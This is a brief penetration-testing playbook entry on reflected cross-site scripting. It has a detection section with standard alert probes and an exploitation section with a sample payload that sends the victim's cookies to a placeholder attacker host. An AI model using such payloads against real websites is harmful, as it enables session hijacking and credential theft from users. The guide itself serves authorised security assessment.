# Reflected XSS

Reflected cross-site scripting occurs when user-controlled input is echoed back into
the HTML response without proper escaping, letting an attacker's script execute in a
victim's browser.

## Detection

- Try payloads like `<script>alert(1)</script>` and `"><img src=x onerror=alert(1)>`
  in search fields, URL parameters, and any user-controlled input.
- Confirmed when the payload appears un-escaped in the response body or a ZAP XSS
  alert fires.
- Stopping point: an un-escaped reflection (or ZAP alert) confirms the vulnerability.
  Weaponized payloads (session hijacking, credential harvesting) belong to the
  Exploitation section below.

Record: endpoint, parameter, the exact payload, and the evidence (response snippet
or ZAP alert).

## Exploitation

Prerequisites: a confirmed reflected-XSS point naming the endpoint and vulnerable
parameter.

- Step 1 — Craft an impact payload, e.g.:
  `<script>document.location='http://attacker.example/?c='+document.cookie</script>`
- Step 2 — Verify the payload is reflected un-escaped in the response.
- Step 3 — Describe the realistic attack vector: who would be targeted, and how
  session theft or credential phishing would work in practice.

Register: the detection payload, the crafted impact payload, and the attack scenario.
